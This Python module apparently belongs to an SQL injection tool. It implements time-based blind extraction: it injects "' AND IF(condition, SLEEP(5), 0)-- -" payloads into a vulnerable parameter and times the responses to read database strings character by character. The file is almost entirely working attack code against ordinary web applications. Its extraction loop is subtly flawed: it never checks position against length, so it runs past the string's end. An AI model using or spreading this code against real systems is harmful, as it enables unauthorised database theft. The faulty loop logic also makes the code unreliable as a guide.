import time
import logging

logger = logging.getLogger(__name__)

class TimeTechnique:
    def __init__(self, request, vuln, settings):
        self.request = request
        self.vuln = vuln
        self.settings = settings
        self.sleep_seconds = 5  # can be adjusted
        
    def extract_string(self, expression):
        """Extract string using time-based blind"""
        result = ""
        pos = 1
        while True:
            length = self._get_length(expression)
            if length == 0:
                break
            for ascii_val in range(32, 127):
                condition = f"ASCII(SUBSTRING(({expression}),{pos},1)) = {ascii_val}"
                if self._check_condition(condition):
                    result += chr(ascii_val)
                    break
            pos += 1
        return result
    
    def _get_length(self, expression):
        low, high = 0, 5000
        while low < high:
            mid = (low + high + 1) // 2
            condition = f"LENGTH(({expression})) >= {mid}"
            if self._check_condition(condition):
                low = mid
            else:
                high = mid - 1
        return low
    
    def _check_condition(self, condition):
        # Build payload that sleeps if condition true
        payload = f"{self.vuln['original_value']}' AND IF(({condition}), SLEEP({self.sleep_seconds}), 0)-- -"
        start = time.time()
        self.request.send(self.vuln['param'], payload, self.vuln['location'])
        elapsed = time.time() - start
        return elapsed > (self.sleep_seconds - 1)